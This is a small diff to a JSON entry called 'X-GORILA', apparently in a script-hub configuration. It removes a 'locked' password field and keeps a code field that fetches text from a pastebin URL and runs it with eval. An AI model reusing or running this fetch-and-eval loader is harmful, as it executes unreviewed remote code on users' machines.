@@ -2,6 +2,5 @@
   "directory": "XGORILA",
   "description": "xgorila",
   "display": "X-GORILA",
-  "code": "async function a(){eval(await fh('https://pastebin.com/raw/NZwfRVNB'))} a()",
-  "password": "locked"
+  "code": "async function a(){eval(await fh('https://pastebin.com/raw/NZwfRVNB'))} a()"
 }
